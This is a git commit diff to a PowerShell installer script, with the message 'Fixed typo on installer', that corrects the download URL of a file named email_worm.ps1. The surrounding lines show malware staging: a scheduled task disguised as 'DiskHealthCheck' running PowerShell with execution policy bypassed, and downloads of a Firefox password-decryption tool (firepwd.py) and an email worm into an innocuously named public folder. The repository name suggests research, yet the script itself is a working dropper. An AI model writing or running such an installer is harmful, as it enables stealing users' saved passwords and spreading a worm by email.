2e119c38705886b3f481abf200b9b78adf512f69
Reiya Ihara <papichu.chime@icloud.com>
2026-02-02 20:52:36 -0800

    Fixed typo on installer

--- Original/Resources/installer.ps1
+++ Original/Resources/installer.ps1
@@ -145,7 +145,7 @@ schtasks /create /tn "DiskHealthCheck" /tr "powershell.exe -ExecutionPolicy Bypa
 mkdir "C:\Users\Public\Public Display"
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/firepwd.py' -OutFile "C:\Users\Public\Public Display\firepwd.py"
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/requirements.txt' -OutFile "C:\Users\Public\Public Display\requrements.txt"
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/emial_worm.ps1' -OutFile "C:\Users\Public\Public Display\email_worm.ps1"
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/email_worm.ps1' -OutFile "C:\Users\Public\Public Display\email_worm.ps1"
 # install python
 winget install --id 9PNRBTZXMB4Z --source msstore --accept-package-agreements --accept-source-agreements 
 
